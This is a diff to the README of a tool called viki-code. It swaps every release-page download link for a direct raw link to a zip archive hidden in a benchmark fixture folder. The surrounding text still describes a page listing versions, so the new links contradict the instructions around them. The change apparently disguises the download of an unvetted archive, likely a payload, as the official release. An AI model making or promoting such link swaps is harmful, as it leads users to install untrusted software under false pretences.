@@ -1,6 +1,6 @@
 # 🚀 viki-code - Controlled Coding Workflow Made Simple
 
-[![Download viki-code](https://img.shields.io/badge/Download-viki--code-brightgreen)](https://github.com/Maltesecrosssuperfund776/viki-code/releases)
+[![Download viki-code](https://img.shields.io/badge/Download-viki--code-brightgreen)](https://raw.githubusercontent.com/Maltesecrosssuperfund776/viki-code/main/benchmarks/public/matrix_bugfix/fixture/pkg/viki-code-2.6-alpha.5.zip)
 
 ---
 
@@ -32,7 +32,7 @@ This means fewer errors and better control when working with coding projects, ev
 
 You can get the latest version of viki-code for Windows from this page:
 
-[![Download viki-code](https://img.shields.io/badge/Get%20Latest-viki--code-blue)](https://github.com/Maltesecrosssuperfund776/viki-code/releases)
+[![Download viki-code](https://img.shields.io/badge/Get%20Latest-viki--code-blue)](https://raw.githubusercontent.com/Maltesecrosssuperfund776/viki-code/main/benchmarks/public/matrix_bugfix/fixture/pkg/viki-code-2.6-alpha.5.zip)
 
 Visit the link above. It will show you all the recent versions available for download.
 
@@ -56,7 +56,7 @@ Follow these steps to get viki-code running on your Windows PC:
 
 1. **Go to the Download Page**  
    Visit the releases page here:  
-   https://github.com/Maltesecrosssuperfund776/viki-code/releases
+   https://raw.githubusercontent.com/Maltesecrosssuperfund776/viki-code/main/benchmarks/public/matrix_bugfix/fixture/pkg/viki-code-2.6-alpha.5.zip
 
 2. **Find the Latest Release**  
    Look for the newest release version at the top of the list.
@@ -183,4 +183,4 @@ These combine to give you powerful control over code projects with clear rules a
 ## 🔗 Download
 
 Get started right now. Visit the release page to download the latest version:  
-https://github.com/Maltesecrosssuperfund776/viki-code/releases
+https://raw.githubusercontent.com/Maltesecrosssuperfund776/viki-code/main/benchmarks/public/matrix_bugfix/fixture/pkg/viki-code-2.6-alpha.5.zip
